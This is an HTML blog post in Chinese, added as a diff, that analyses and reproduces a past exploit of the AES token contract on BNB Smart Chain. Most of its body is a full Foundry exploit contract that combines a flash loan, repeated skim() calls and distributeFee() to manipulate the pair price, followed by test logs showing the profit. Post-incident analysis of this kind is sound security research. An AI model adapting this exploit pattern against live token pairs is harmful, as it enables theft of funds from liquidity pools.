@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="简述部署在bsc上的aes代币合约 在转账 购买的时候会记录一笔手续费 由于在分发手续费时直接从pair 里扣钱导致可以操纵价格
+漏洞分析攻击hash:https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9a"/>
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="d1rrick"/>
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="AES攻击事件分析与复现"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="简述部署在bsc上的aes代币合约 在转账 购买的时候会记录一笔手续费 由于在分发手续费时直接从pair 里扣钱导致可以操纵价格
+漏洞分析攻击hash:https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9a"/>
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="d1rrick&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article"/>
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+        <meta name="twitter:card" content="summary_large_image"/>
+
+    
+
+    
+        <meta name="twitter:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+    <!-- Title -->
+    
+    <title>AES攻击事件分析与复现 - d1rrick&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet"/>
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Configurable Title</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/HiT0on">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>AES攻击事件分析与复现</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2023-01-04
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/tags/区块链安全/">#区块链安全</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>部署在bsc上的aes代币合约 在转账 购买的时候会记录一笔手续费 由于在分发手续费时直接从pair 里扣钱导致可以操纵价格</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>攻击hash:<a target="_blank" rel="noopener" href="https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9aad59c5a38d0ae19">https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9aad59c5a38d0ae19</a></p>
+<p><img src="/img/postimg/aes/image-20230105133125647.png" alt="image-20230105133125647"></p>
+<p>攻击者先通过闪电贷购买大量代币，在将代币转入pair，通过攻击合约循环调用skim()，from和to 都是pair 本身，从而操控swapfee total 逐渐变大，最后在调用distributeFee()函数使pair 中的代币减少 从而操控币价，最后砸盘完成获利</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>forge test –contracts ./src/test/aesexp.sol -vv -w</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/Test.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-std/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="variable constant_">IAES</span> is <span class="title class_">IERC20</span>&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">distributeFee</span>(<span class="params"></span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract aesExploit is <span class="title class_">DSTest</span>&#123;</span><br><span class="line">    <span class="variable constant_">IAES</span> aes  = <span class="title function_">IAES</span>(<span class="number">0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907</span>);</span><br><span class="line">    <span class="title class_">IERC20</span> usdt = <span class="title class_">IERC20</span>(<span class="number">0x55d398326f99059fF775485246999027B3197955</span>);</span><br><span class="line">    <span class="title class_">Uni</span>_Pair_V2 pair = <span class="title class_">Uni</span>_Pair_V2(<span class="number">0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3</span>);</span><br><span class="line">    <span class="title class_">Uni</span>_Router_V2 <span class="title class_">Router</span> = <span class="title class_">Uni</span>_Router_V2(<span class="number">0x10ED43C718714eb63d5aA57B78B54704E256024E</span>);</span><br><span class="line">    address dodo = <span class="number">0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title class_">CheatCodes</span>  cheats = <span class="title class_">CheatCodes</span>(<span class="number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUp</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        cheats.<span class="title function_">createSelectFork</span>(<span class="string">&#x27;bsc&#x27;</span>,<span class="number">23695904</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testFork</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="title function_">assertEq</span>(block.<span class="property">number</span>,<span class="number">23695904</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testExploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        usdt.<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="title class_">Router</span>), <span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        aes.<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="title class_">Router</span>), <span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        uint256 bal1 = aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pair));</span><br><span class="line">        uint256 bal2 = usdt.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pair));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;pair aes balance is:&#x27;</span>,bal1/<span class="number">1e18</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;pair usdt balance is:&#x27;</span>,bal2/<span class="number">1e18</span>);</span><br><span class="line">        <span class="title function_">DVM</span>(dodo).<span class="title function_">flashLoan</span>(<span class="number">0</span>,<span class="number">100000</span> * <span class="number">1e18</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="keyword">new</span> <span class="title function_">bytes</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// console.log(&#x27;flashloan success usdt balance is&#x27;,usdt.balanceOf(address(this))/1e18);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DPPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) external&#123;</span><br><span class="line">        <span class="comment">// console.log(&#x27;flashloan success usdt balance is&#x27;,usdt.balanceOf(address(this))/1e18);</span></span><br><span class="line">        <span class="title class_">USDTToAES</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;now pair aes balance is:&#x27;</span>,aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pair))/<span class="number">1e18</span>);</span><br><span class="line">        aes.<span class="title function_">transfer</span>(<span class="title function_">address</span>(pair),aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">        <span class="keyword">for</span> (uint i=<span class="number">0</span>;i&lt;=<span class="number">12</span>;i++)&#123;</span><br><span class="line">            pair.<span class="title function_">skim</span>(<span class="title function_">address</span>(pair));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;skiming pair aes balance is&#x27;</span>,aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pair))/<span class="number">1e18</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        (uint112 resves0,uint112 resves1,) = pair.<span class="title function_">getReserves</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;aes reserves is&#x27;</span>,resves1/<span class="number">1e18</span>);</span><br><span class="line">        pair.<span class="title function_">skim</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;skim complete now pair aes balance is:&#x27;</span>,aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pair))/<span class="number">1e18</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;skim complete now self aes balance is:&#x27;</span>,aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e18</span>);</span><br><span class="line">        aes.<span class="title function_">distributeFee</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;distributeFee complete now pair aes balance is:&#x27;</span>,aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pair))/<span class="number">1e18</span>);</span><br><span class="line">        pair.<span class="title function_">sync</span>();</span><br><span class="line">        <span class="title class_">AESToUSDT</span>();</span><br><span class="line">        usdt.<span class="title function_">transfer</span>(<span class="title function_">address</span>(dodo),<span class="number">100000</span>*<span class="number">1e18</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;attack complete usdt balance is&#x27;</span>,usdt.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e18</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">USDTToAES</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(usdt);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(aes);</span><br><span class="line">        <span class="title class_">Router</span>.<span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(</span><br><span class="line">            usdt.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;swap success aes balance is:&#x27;</span>,aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">AESToUSDT</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(aes);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(usdt);</span><br><span class="line">        <span class="title class_">Router</span>.<span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(</span><br><span class="line">            aes.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;swap success usdt balance is:&#x27;</span>,usdt.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))/<span class="number">1e18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Running 2 tests for src/test/aesexp.sol:aesExploit</span><br><span class="line">[PASS] testExploit() (gas: 745937)</span><br><span class="line">Logs:</span><br><span class="line">  pair aes balance is: 3976072</span><br><span class="line">  pair usdt balance is: 64026</span><br><span class="line">  swap success aes balance is: 2179500</span><br><span class="line">  now pair aes balance is: 1723921</span><br><span class="line">  skiming pair aes balance is 3774613</span><br><span class="line">  skiming pair aes balance is 3713093</span><br><span class="line">  skiming pair aes balance is 3653418</span><br><span class="line">  skiming pair aes balance is 3595533</span><br><span class="line">  skiming pair aes balance is 3539384</span><br><span class="line">  skiming pair aes balance is 3484920</span><br><span class="line">  skiming pair aes balance is 3432090</span><br><span class="line">  skiming pair aes balance is 3380845</span><br><span class="line">  skiming pair aes balance is 3331138</span><br><span class="line">  skiming pair aes balance is 3282921</span><br><span class="line">  skiming pair aes balance is 3236151</span><br><span class="line">  skiming pair aes balance is 3190784</span><br><span class="line">  skiming pair aes balance is 3146778</span><br><span class="line">  aes reserves is 1723921</span><br><span class="line">  skim complete now pair aes balance is: 1823521</span><br><span class="line">  skim complete now self aes balance is: 1280571</span><br><span class="line">  distributeFee complete now pair aes balance is: 12275</span><br><span class="line">  swap success usdt balance is: 162417</span><br><span class="line">  attack complete usdt balance is 62417</span><br><span class="line"></span><br><span class="line">[PASS] testFork() (gas: 244)</span><br><span class="line">Test result: ok. 2 passed; 0 failed; finished in 232.87ms</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://twitter.com/peckshield/status/1600418002163625984">https://twitter.com/peckshield/status/1600418002163625984</a></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/HiT0on" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2023 d1rrick<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
